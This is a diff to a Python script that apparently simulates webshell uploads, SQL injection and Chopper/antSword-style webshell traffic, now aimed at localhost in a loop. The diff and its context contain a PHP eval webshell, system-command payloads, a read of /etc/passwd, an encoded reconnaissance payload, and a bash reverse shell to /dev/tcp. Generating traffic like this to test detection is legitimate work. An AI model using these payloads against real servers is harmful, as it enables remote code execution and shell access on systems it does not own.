@@ -3,6 +3,7 @@ import random
 import base64
 from urllib3 import encode_multipart_formdata
 from urllib import parse
+import time
 #mock webshell_upload  SQLI webshell_useing
 #
 webshells={1:{'fn':'123456789.php','fd':'<?php @eval($_POST[\'666666\']);?>'},
@@ -31,7 +32,7 @@ chopper={
 }
 raw={
 1:'pass=@eval(system(\'whoami\'));',
-2:'pass=\'whoami\'',
+2:'pass=%40ini_set%28%22display_errors%22%2C%20%220%22%29%3B%40set_time_limit%280%29%3Becho%20%22pass%22%3Btry%7B%24D%3Ddirname%28%24_SERVER%5B%22SCRIPT_FILENAME%22%5D%29%3Bif%28%24D%3D%3D%22%22%29%24D%3Ddirname%28%24_SERVER%5B%22PATH_TRANSLATED%22%5D%29%3B%24R%3D%22%7B%24D%7D%09%22%3Bif%28substr%28%24D%2C0%2C1%29%21%3D%22%2F%22%29%7Bforeach%28range%28%22C%22%2C%22Z%22%29as%20%24L%29if%28is_dir%28%22%7B%24L%7D%3A%22%29%29%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D%28function_exists%28%22posix_getegid%22%29%29%3F%40posix_getpwuid%28%40posix_geteuid%28%29%29%3A%22%22%3B%24s%3D%28%24u%29%3F%24u%5B%22name%22%5D%3A%40get_current_user%28%29%3B%24R.%3Dphp_uname%28%29%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch%28Exception%20%24e%29%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage%28%29%3B%7D%3Becho%20%220a5f4%22%3Bdie%28%29%3B',
 3:'pass=cat%20/etc/passwd',
 4:'pass=@eval(system(\'id\'));',
 5:'pass=@eval(system(\'system\'));'
@@ -45,8 +46,7 @@ def gen_str(mode=0):
     if(mode==1):
         table +='ABCDEFGHIJKLMNOPQRSTOVWXYZ!@#$%^&*()'
     return ''.join(random.sample(table, random.randint(4, 8)))
-def webshell_upload(url='http://www.baidu.com/'):
-    print('test1')
+def webshell_upload(url='http://127.0.0.1/'):
     url+=uppaths[random.randint(1, 5)]
     data = {}
     sn=random.randint(1, 6)
@@ -54,7 +54,7 @@ def webshell_upload(url='http://www.baidu.com/'):
     encode_data = encode_multipart_formdata(data)
     requests.post(url,data=encode_data[0],headers=dict(HADER,**{'User-Agent':UA[random.randint(1, 4)],'Content-Type':encode_data[1]}))
     print ("webshell_upload")
-def SQLI(url='http://www.baidu.com/'):
+def SQLI(url='http://127.0.0.1/'):
     url+=sqlipaths[random.randint(1, 5)]
     url+=sqlis[random.randint(1, 5)]
     requests.get(url,headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
@@ -65,23 +65,26 @@ def webshell_useing(url='http://127.0.0.1/'):
     chopper_mock(url)
     raw_mock(url)
 def chopper_mock(url):
-    requests.post(url,data=chopper[1].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[2].replace("pass",gen_str()), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=chopper[3].replace("pass",gen_str())+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=chopper[1].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
+    requests.post(url,data=chopper[2].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
+    requests.post(url,data=chopper[3].replace("pass",gen_str())+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
 def raw_mock(url):
-    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
-    requests.post(url,data=gen_str()+'='+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)]}))
+    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
+    requests.post(url,data=raw[random.randint(1, 5)].replace("pass",gen_str()),headers=dict(HADER, **{'User-Agent': 'User-Agent: antSword/v2.0','Content-Type':'application/x-www-form-urlencoded'}))
+    requests.post(url,data=gen_str()+'='+parse.quote(base64.b64encode(('bash -i >& /dev/tcp/'+randomIP()+'/443 0>&1').encode())), headers=dict(HADER, **{'User-Agent': UA[random.randint(1, 4)],'Content-Type':'application/x-www-form-urlencoded'}))
 
 def randomIP():
     a= random.sample(list(range(1,256))*4, 4)
     b= map(str,a)
     return '.'.join(b)
 def Make():
+    url="http://localhost/"
     switch = {1:webshell_upload, 2:SQLI, 3:webshell_useing}
-    mode=3
-    if mode==-1:
-        mode=random.randint(1, 4)
-    switch[mode]()
-
+    mode=-1
+    while 1:
+        if mode == -1:
+            mode = random.randint(1, 3)
+        switch[mode](url)
+        time.sleep(10)
 if __name__ == '__main__':
     Make()
